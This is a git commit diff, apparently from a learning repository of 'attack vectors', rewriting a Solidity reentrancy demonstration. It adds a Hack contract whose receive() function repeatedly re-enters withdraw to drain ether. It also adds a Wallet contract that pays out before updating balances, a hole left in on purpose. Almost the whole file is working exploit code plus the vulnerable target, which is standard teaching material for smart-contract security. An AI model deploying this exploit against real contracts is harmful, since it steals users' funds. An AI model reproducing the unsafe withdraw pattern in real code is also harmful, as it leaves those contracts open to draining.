d00e5b3fc128851ecedd7ca7ae8cc83c5532d2f6
MinovS65 <pesopesaka@gmail.com>
2025-12-21 19:18:05 +0200

    working reentrancy

--- Attack Vectors/reentrancy.sol
+++ Attack Vectors/reentrancy.sol
@@ -1,46 +1,35 @@
-// SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.0;
+//SPDX-License-Identifier: UNLICENSED
+pragma solidity 0.6.12;
 
-contract Bank {
-    mapping(address => uint) balances;
-    
-    function deposit() external payable{
+contract Hack {
+    Wallet public wallet;
+    constructor(address _wallet) public{
+        wallet = Wallet(payable(_wallet));
+    }
+    function attack() external payable {
+        require(msg.value>=1 ether, "send more money");
+        wallet.deposit{value: 1 ether}();
+        wallet.withdraw(1 ether);
+    }
+
+    receive() payable external {
+        if (address(wallet).balance>=1 ether) {
+             wallet.withdraw(1 ether);
+        }
+    }
+}
+
+contract Wallet {
+    mapping(address => uint) public balances;
+    function deposit() public payable {
         balances[msg.sender]+=msg.value;
     }
-    function getBalance() external view returns(uint) {
-        return balances[msg.sender];
-    }
-
-    function withdraw(uint amount) external {
-        require(balances[msg.sender]>=amount, "you aint that rich");
+    function withdraw(uint amount) public payable{
+        require(balances[msg.sender]>=amount, "not enough money");
+        (bool sent,) = payable(msg.sender).call{value: amount}("");
+        require(sent, "call failed");
+        balances[msg.sender]-= amount;
         
-        (bool sent,) = msg.sender.call{value: amount * 1 ether}("");
-
-        require(sent, "failed to send ether");
-        
-        balances[msg.sender]-=amount*1 ether;
     }
-
-    receive() external payable{}
+    receive() payable external {}
 }
-
-contract Attack {
-    Bank bank;
-    constructor(address _bankAddress) {
-        bank = Bank(payable(_bankAddress));
-    }
-    uint amount=1 ether;
-    function attack() external payable{
-        require(msg.value >= amount, "Send at least 1 ether to attack");
-        bank.deposit{value: amount}();
-        bank.withdraw(amount);
-
-    }
-    receive() external payable {
-        if (address(bank).balance >= amount) {
-            bank.withdraw(amount);
-        }    
-    }
-}
-
-
